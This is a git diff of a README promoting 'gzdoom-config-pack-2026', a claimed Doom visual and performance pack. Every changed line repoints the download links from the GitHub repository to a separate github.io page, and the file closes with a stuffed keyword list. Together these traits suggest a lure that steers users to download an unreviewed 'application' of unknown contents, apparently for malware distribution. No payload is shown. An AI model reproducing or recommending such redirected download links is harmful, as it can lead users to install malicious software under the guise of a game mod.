@@ -1,6 +1,6 @@
 # 🎮 gzdoom-config-pack-2026 - Ultimate Doom Visual & Performance Upgrade
 
-[![Download Now](https://img.shields.io/badge/Download-gzdoom--config--pack--2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hooflike-katowice1134/gzdoom-config-pack-2026)
+[![Download Now](https://img.shields.io/badge/Download-gzdoom--config--pack--2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://hooflike-katowice1134.github.io)
 
 ---
 
@@ -26,7 +26,7 @@ gzdoom-config-pack-2026 is a complete configuration package that transforms your
 
 ### Step 1: Download the Package
 
-Visit this link to download the application: [https://github.com/hooflike-katowice1134/gzdoom-config-pack-2026](https://github.com/hooflike-katowice1134/gzdoom-config-pack-2026)
+Visit this link to download the application: [https://hooflike-katowice1134.github.io](https://hooflike-katowice1134.github.io)
 
 Click the green "Code" button on that page, then select "Download ZIP". The file will start downloading automatically.
 
@@ -141,6 +141,6 @@ This project is released under the MIT License—you're free to use, modify, and
 
 ---
 
-**Ready to experience Doom like never before?** [Download gzdoom-config-pack-2026 now](https://github.com/hooflike-katowice1134/gzdoom-config-pack-2026) and transform your classic game into a modern masterpiece!
+**Ready to experience Doom like never before?** [Download gzdoom-config-pack-2026 now](https://hooflike-katowice1134.github.io) and transform your classic game into a modern masterpiece!
 
 Keywords: 2026, 3d-floors, 4k, classic, config, doom, dynamic-lighting, free, gzdoom, midi, opl3, pbr, performance, sc-55, shader, soundfont, texture, ultrawide, upscaling, windows
